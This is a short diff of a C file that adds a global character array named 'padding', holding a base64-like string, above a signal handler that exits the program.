@@ -7,6 +7,8 @@
 #include <stdint.h>
 #include <signal.h>
 
+char padding[] = "jJcII7aGdQI59GcuLLoz7trXn50X1eppkyj3bRZQ3F/a08W7u+PU+e9awsOotL0==";
+
 void handler(int sig)
 {
     exit(0);
